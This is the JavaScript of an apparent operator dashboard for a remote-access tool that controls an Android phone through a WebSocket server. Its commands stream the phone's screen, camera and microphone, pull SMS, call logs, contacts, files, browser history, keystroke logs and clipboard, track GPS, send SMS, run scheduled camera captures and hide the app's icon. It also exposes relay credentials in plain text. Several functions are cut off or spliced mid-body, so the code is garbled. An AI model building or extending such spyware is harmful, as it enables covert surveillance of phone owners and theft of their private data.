<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script type="module">
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    // WebRTC peer connections
    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    // UI state
    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;
    let flashOn = false; // local flash state

    // Live camera recording state
    let mediaRecorder = null;
    let recordedChunks = [];

    // Audio recording variables
    let audioMediaRecorder = null;
    let audioRecordedChunks = [];

    // Track the last command sent to interpret raw responses
    let pendingCommand = null;

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    // Modal elements
    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
modalVideo.addEventListener("loadedmetadata", () => {

    const w = modalVideo.videoWidth;
    const h = modalVideo.videoHeight;

    const popup = document.querySelector(".mobile-popup");

    if (h > w) {
        // Portrait phone
        popup.style.aspectRatio = "9 / 16";
    } else {
        // Landscape screen
        popup.style.aspectRatio = "16 / 9";
    }

});
    
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');
   
    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }
    // ---------- ICE SERVERS ----------
    const ICE_SERVERS = [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    // ---------- SIGNALING OVER WEBSOCKET ----------
    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        const payload = {
            type: 'SIGNALING',
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type);
    }

    // ---------- PEER CONNECTION CREATORS ----------
    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

        // Add transceivers to receive media
        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = onTrackCallback;
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    // Also close modal if it's open
                    closeScreenModal();
                }
            }
        };
        pc.onconnectionstatechange = () => {
            console.log(`${streamType} connection state:`, pc.connectionState);
        };
        return pc;
    }

    // Helper to get the correct peer connection based on stream type
    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
            }

    function startScreenRecording(canvas, ctx, originalStream) {
    canvas.width = modalVideo.videoWidth;
    canvas.height = modalVideo.videoHeight;

    function drawVideoFrame() {
        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawVideoFrame);
    }
    drawVideoFrame();

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm', videoBitsPerSecond: 1000000 }); // 1 Mbps compressed
    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
    screenMediaRecorder.onstop = () => {
        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());
    };
    screenMediaRecorder.start();
    modalRecordBtn.innerText = '🟢';          // green dot = stop recording
}

    // ---------- COMMAND SENDING (JSON) ----------
    function sendCommand(command, params = {}) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }
        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent: ${command}`;
        pendingCommand = command;
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
    function sendPlainText(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }
        ws.send(msg);
        panel.innerHTML = `📤 Plain text sent: ${msg}`;
    }

    // ---------- PLAIN TEXT / JSON HANDLERS ----------
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);
        switch (json.type) {

                dataType = 'sms';
                currentData = parseDataField(json.data);
                renderSMS(); // use dedicated render
                pendingCommand = null;
                break;
            case 'CALL_LOGS':
                dataType = 'call';
                currentData = parseDataField(json.data);
                renderCallLogs(); // use dedicated render
                pendingCommand = null;
                break;
            case 'FILE_LIST':
                dataType = 'file';
                currentData = parseDataField(json.data);
                renderFiles();
                pendingCommand = null;
                break;
            case 'LOCATION_UPDATE':
                renderMap(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                pendingCommand = null;
                break;
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                pendingCommand = null;
                break;
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                pendingCommand = null;
                break;
            case 'DEVICE_STATUS':
                setStatus(json.status);
                pendingCommand = null;
                break;
            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                pendingCommand = null;
                break;
            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { screenPC.close(); screenPC = null; }
                showNotification('Screen share stopped');
                pendingCommand = null;
                break;
            case 'CONTACTS_DATA':
                displayContacts(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'INSTALLED_APPS':
                displayInstalledApps(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'APP_USAGE_DATA':
                displayAppUsage(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'NOTIFICATIONS_DATA':
                displayNotifications(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'NOTIFICATIONS_CLEARED':
                showNotification('Notifications cleared');
                break;
            case 'BROWSER_HISTORY_DATA':
                displayBrowserHistory(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'KEYLOG_DATA':
                displayKeylog(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'KEYLOG_CLEARED':
                showNotification('Keylog cleared');
                break;
            case 'CLIPBOARD_DATA':
                displayClipboard(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'WIFI_NETWORKS_DATA':
                displayWifiNetworks(parseDataField(json.data));
                pendingCommand = null;
                break;
            case 'GEOFENCE_SET':
                showNotification('✅ Geofence activated');
                break;
            case 'GEOFENCE_CLEARED':
                showNotification('Geofence cleared');
                break;
            case 'GEOFENCE_INFO': {
                const gfInfo = parseDataField(json.data);
                if (gfInfo && gfInfo.active) {
                    panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + gfInfo.lat.toFixed(5) + ', ' + gfInfo.lon.toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
                } else {
                    panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
                }
                break;
            }
            case 'GEOFENCE_ALERT': {
                const gfMsg = json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone';
                pushAlert('Geofence', gfMsg);
                showNotification(gfMsg);
                break;
            }
            case 'SCHEDULED_CAPTURE_SET':
                showNotification('✅ Auto-capture started');

                showNotification('Auto-capture stopped');
                break;
            case 'DEVICE_LOCKED':
                showNotification('🔒 Screen locked');
                break;
            case 'SMS_SENT':
                showNotification('✅ SMS sent successfully');
                break;
            case 'FILE_DELETED':
                showNotification('File deleted');
                sendCommand('LIST_FILES', { path: currentPath });
                break;
            case 'VIBRATE_COMPLETE':
                showNotification('📳 Vibrated');
                break;
            case 'UNINSTALL_INITIATED':
                showNotification('Uninstall initiated');
                break;
            case 'APP_OPENED':

                    gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track';
                    gpsBtn.style.cssText = '';
                }
                showNotification('GPS tracking stopped');
                break;
            }
            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms';
                    currentData = json;
                    renderSMS();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call';
                    currentData = json;
                    renderCallLogs();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json);
                    pendingCommand = null;
                }
                break;
        }
    }

    function parseDataField(data) {
        if (typeof data === 'string') {
            try {
                return JSON.parse(data);
            } catch (e) {
                return data;
            }
        }
        return data;
    }

    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
            pendingCommand = null;
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderSMS();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderCallLogs();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
            pendingCommand = null;
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { screenPC.close(); screenPC = null; }
            showNotification('Screen share stopped');
            pendingCommand = null;
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
            pendingCommand = null;
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
            pendingCommand = null;
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
            pendingCommand = null;
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
            pendingCommand = null;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            downloadBase64(base64, 'downloaded_file');
            pendingCommand = null;
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

function startCanvasRecording(video, canvas, ctx, originalStream) {
    canvas.width = video.videoWidth;

    function drawVideoFrame() {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm', videoBitsPerSecond: 1000000 }); // 1 Mbps compressed
    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recording_${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());

        let parts = currentPath.split('/');

        currentPath = parent;

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                // Assume it's a command response or other JSON
                handleJSON(json);
            }
        } catch (e) {
            // Not JSON – treat as plain text
            handlePlainText(msg);
        }
    }

            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('ONLINE');
            panel.innerHTML = '✅ Connected to server. Ready.';
        };
        ws.onmessage = (e) => {

        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
            ws = null;
        };

        const h3 = document.createElement('h3'); h3.textContent = '🌐 Browser History (' + data.length + ')';
        panel.appendChild(h3);

        const wrap = document.createElement('div'); wrap.style.overflowX = 'auto';
        const tbl = document.createElement('table');
        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:12px';
        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Date</th><th style="padding:8px;text-align:left">Title</th><th style="padding:8px;text-align:left">URL</th></tr></thead>';
        const tbody = document.createElement('tbody');
        data.forEach(function(item) {
            const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;white-space:nowrap;color:#999;font-size:11px'; td1.textContent = item.date || '';
            const td2 = document.createElement('td'); td2.style.padding = '5px 8px'; td2.textContent = item.title || '';
            const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
            const a = document.createElement('a'); a.href = item.url || '#'; a.target = '_blank'; a.style.cssText = 'color:#1976ff;text-decoration:none'; a.textContent = item.url || '';
            td3.appendChild(a);
            tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
            tbody.appendChild(tr);
        });
        tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
    }

    // ── Wi-Fi Networks ────────────────────────────────────────────────────────
    function displayWifiNetworks(data) {
        panel.innerHTML = '';
        if (!Array.isArray(data) || data.length === 0) {
            panel.innerHTML = '<h3>📶 Wi-Fi</h3><p style="color:#999">No networks found.</p>';
            return;
        }
        const h3 = document.createElement('h3'); h3.textContent = '📶 Wi-Fi Networks (' + data.length + ')';
        panel.appendChild(h3);
        const wrap = document.createElement('div'); wrap.style.overflowX = 'auto';
        const tbl = document.createElement('table');
        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:13px';
        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">SSID</th><th style="padding:8px">Signal</th><th style="padding:8px">Status</th></tr></thead>';
        const tbody = document.createElement('tbody');
        data.forEach(function(n) {
            const bars = n.rssi > -50 ? '████' : n.rssi > -70 ? '███░' : n.rssi > -80 ? '██░░' : '█░░░';
            const tr = document.createElement('tr');
            tr.style.borderBottom = '1px solid #f0f0f0';
            if (n.connected) tr.style.background = '#f0fff4';
            const td1 = document.createElement('td'); td1.style.padding = '7px 8px'; td1.style.fontWeight = n.connected ? '700' : '400'; td1.textContent = n.ssid || '(hidden)';
            const td2 = document.createElement('td'); td2.style.cssText = 'padding:7px 8px;text-align:center;font-family:monospace;color:#1976ff'; td2.textContent = bars;
            const td3 = document.createElement('td'); td3.style.cssText = 'padding:7px 8px;text-align:center';
            if (n.connected) { td3.style.color = '#4caf50'; td3.style.fontWeight = '700'; td3.textContent = '● Connected'; }
            else { td3.style.color = '#ccc'; td3.textContent = '○'; }
            tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
            tbody.appendChild(tr);
        });
        tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
    }

    // ── Clipboard ─────────────────────────────────────────────────────────────
    function displayClipboard(data) {
        const clip = (typeof data === 'object' && data !== null) ? data : { content: String(data || ''), type: 'text' };
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '📋 Clipboard';
        const card = document.createElement('div');
        card.style.cssText = 'background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;margin-top:12px';
        const typeDiv = document.createElement('div'); typeDiv.style.cssText = 'font-size:11px;color:#999;margin-bottom:6px'; typeDiv.textContent = 'Type: ' + (clip.type || 'unknown');
        const contentDiv = document.createElement('div'); contentDiv.style.cssText = 'font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6'; contentDiv.textContent = clip.content || '(empty)';
        card.appendChild(typeDiv); card.appendChild(contentDiv);
        panel.appendChild(h3); panel.appendChild(card);
    }

    // ── Geofence ──────────────────────────────────────────────────────────────
    function showGeofencePanel() {
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '🗺️ Geofence — Safety Zone';
        const desc = document.createElement('p'); desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:12px'; desc.textContent = 'Click the map to set the safe zone centre.';
        const mapDiv = document.createElement('div'); mapDiv.id = 'geofenceMap'; mapDiv.style.cssText = 'width:100%;height:300px;border-radius:10px;margin-bottom:12px';

        const controls = document.createElement('div'); controls.style.cssText = 'display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end';

        function makeInput(labelText, id, type, placeholder, width, value) {
            const wrap = document.createElement('div');
            const lbl = document.createElement('label'); lbl.style.cssText = 'font-size:12px;color:#999'; lbl.textContent = labelText;
            const inp = document.createElement('input'); inp.id = id; inp.type = type; inp.placeholder = placeholder || '';
            inp.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:' + width;
            if (value !== undefined) inp.value = value;
            wrap.appendChild(lbl); wrap.appendChild(inp); return wrap;
        }

        controls.appendChild(makeInput('Latitude',   'gfLat',    'number', 'e.g. 20.2961', '130px'));
        controls.appendChild(makeInput('Longitude',  'gfLon',    'number', 'e.g. 85.8245', '130px'));
        controls.appendChild(makeInput('Radius (m)', 'gfRadius', 'number', '',             '90px', '500'));

        const btnRow = document.createElement('div'); btnRow.style.cssText = 'display:flex;gap:8px';
        [['Set Fence', '#4caf50', function() { setGeofence(); }],
         ['Clear',     '#d32f2f', function() { sendCommand('CLEAR_GEOFENCE'); }],
         ['Status',    '#1976ff', function() { sendCommand('GET_GEOFENCE'); }]
        ].forEach(function(item) {
            const b = document.createElement('button');
            b.textContent = item[0];
            b.style.cssText = 'padding:8px 16px;background:' + item[1] + ';color:#fff;border:none;border-radius:8px;cursor:pointer';
            b.addEventListener('click', item[2]);
            btnRow.appendChild(b);
        });
        controls.appendChild(btnRow);

        panel.appendChild(h3); panel.appendChild(desc); panel.appendChild(mapDiv); panel.appendChild(controls);

        setTimeout(function() {
            try {
                const gm = L.map('geofenceMap').setView([20.5937, 78.9629], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(gm);
                let mk, ci;
                gm.on('click', function(ev) {
                    document.getElementById('gfLat').value = ev.latlng.lat.toFixed(6);
                    document.getElementById('gfLon').value = ev.latlng.lng.toFixed(6);
                    if (mk) gm.removeLayer(mk);
                    if (ci) gm.removeLayer(ci);
                    mk = L.marker([ev.latlng.lat, ev.latlng.lng]).addTo(gm);
                    const r = parseFloat(document.getElementById('gfRadius').value) || 500;
                    ci = L.circle([ev.latlng.lat, ev.latlng.lng], { radius: r, color: '#1976ff', fillOpacity: 0.15 }).addTo(gm);
                });
            } catch(err) { console.warn('Leaflet:', err); }
        }, 100);
    }

    function setGeofence() {
        const lat = parseFloat(document.getElementById('gfLat').value);
        const lon = parseFloat(document.getElementById('gfLon').value);
        const radius = parseFloat(document.getElementById('gfRadius').value) || 500;
        if (isNaN(lat) || isNaN(lon)) { showNotification('Enter valid coordinates'); return; }
        sendCommand('SET_GEOFENCE', { lat: lat, lon: lon, radius: radius });
    }

    function useLocationAsGeofence(lat, lon) {
        sendCommand('SET_GEOFENCE', { lat: lat, lon: lon, radius: 500 });
        showNotification('Geofence set at ' + lat.toFixed(4) + ', ' + lon.toFixed(4));
    }

    // ── Auto Screenshot ───────────────────────────────────────────────────────
    function showSchedulePanel() {
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '⏱️ Auto Screenshot';
        const card = document.createElement('div'); card.style.cssText = 'display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;background:#f9f9f9;border-radius:10px;padding:16px';

        const wrap1 = document.createElement('div');
        const l1 = document.createElement('label'); l1.style.cssText = 'font-size:12px;color:#999'; l1.textContent = 'Interval (minutes)';
        const inp1 = document.createElement('input'); inp1.id = 'schedInterval'; inp1.type = 'number'; inp1.value = '5'; inp1.min = '1';
        inp1.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:90px;margin-top:4px';
        wrap1.appendChild(l1); wrap1.appendChild(inp1);

        const wrap2 = document.createElement('div');
        const l2 = document.createElement('label'); l2.style.cssText = 'font-size:12px;color:#999'; l2.textContent = 'Camera';
        const sel = document.createElement('select'); sel.id = 'schedCam';
        sel.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-top:4px';
        [['Rear', '0'], ['Front', '1']].forEach(function(opt) {
            const o = document.createElement('option'); o.value = opt[1]; o.textContent = opt[0]; sel.appendChild(o);
        });
        wrap2.appendChild(l2); wrap2.appendChild(sel);

        const btnRow = document.createElement('div'); btnRow.style.cssText = 'display:flex;gap:8px';
        const startBtn = document.createElement('button');
        startBtn.textContent = '▶ Start';
        startBtn.style.cssText = 'padding:8px 16px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer';
        startBtn.addEventListener('click', startScheduledCapture);
        const stopBtn = document.createElement('button');
        stopBtn.textContent = '■ Stop';
        stopBtn.style.cssText = 'padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer';
        stopBtn.addEventListener('click', function() { sendCommand('STOP_SCHEDULED_CAPTURE'); });
        btnRow.appendChild(startBtn); btnRow.appendChild(stopBtn);

        card.appendChild(wrap1); card.appendChild(wrap2); card.appendChild(btnRow);
        const note = document.createElement('p'); note.style.cssText = 'color:#999;font-size:12px;margin-top:10px'; note.textContent = 'Images appear in the camera section when captured.';
        panel.appendChild(h3); panel.appendChild(card); panel.appendChild(note);
    }

    function startScheduledCapture() {
        const mins = parseInt(document.getElementById('schedInterval').value) || 5;
        const cam  = parseInt(document.getElementById('schedCam').value);
        sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam });
        showNotification('Auto-capture every ' + mins + ' min');
    }

    // ── Send SMS ──────────────────────────────────────────────────────────────
    function showSendSmsPanel() {
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '✉️ Send SMS';
        const form = document.createElement('div'); form.style.cssText = 'display:flex;flex-direction:column;gap:12px;max-width:400px;margin-top:12px';

        function makeField(labelText, id, tagName, extra) {
            const wrap = document.createElement('div');
            const lbl = document.createElement('label'); lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:4px'; lbl.textContent = labelText;
            const inp = document.createElement(tagName); inp.id = id;
            inp.style.cssText = 'width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;box-sizing:border-box';
            if (extra) Object.assign(inp, extra);
            wrap.appendChild(lbl); wrap.appendChild(inp); return wrap;
        }
        form.appendChild(makeField('Phone Number', 'smsNumber', 'input', { type: 'tel', placeholder: '+91 99999 00000' }));
        form.appendChild(makeField('Message',      'smsBody',   'textarea', { rows: 4, placeholder: 'Type message…', style: 'width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;resize:vertical;box-sizing:border-box' }));

        const sendBtn = document.createElement('button');
        sendBtn.textContent = '📤 Send';
        sendBtn.style.cssText = 'padding:10px 20px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px';
        sendBtn.addEventListener('click', doSendSms);
        form.appendChild(sendBtn);
        panel.appendChild(h3); panel.appendChild(form);
    }

    function doSendSms() {
        const number = document.getElementById('smsNumber').value.trim();
        const body   = document.getElementById('smsBody').value.trim();
        if (!number || !body) { showNotification('Enter number and message'); return; }
        sendCommand('SEND_SMS', { number: number, body: body });
    }


    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.snapScreen = snapScreenFromModal;
    window.showAppUsagePanel = showAppUsagePanel;
    window.showGeofencePanel = showGeofencePanel;
    window.showSchedulePanel = showSchedulePanel;
    window.showSendSmsPanel = showSendSmsPanel;
    window.setGeofence = setGeofence;
    window.useLocationAsGeofence = useLocationAsGeofence;
    window.doSendSms = doSendSms;
    window.startScheduledCapture = startScheduledCapture;
    window.clearAlerts = clearAlerts;
    window.toggleLiveGps = toggleLiveGps;
    window.toggleFlash = toggleFlash;
    window.blinkFlash = blinkFlash;

    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    // ---------- START ----------
    connectWebSocket();
</script>
</body>
</html>
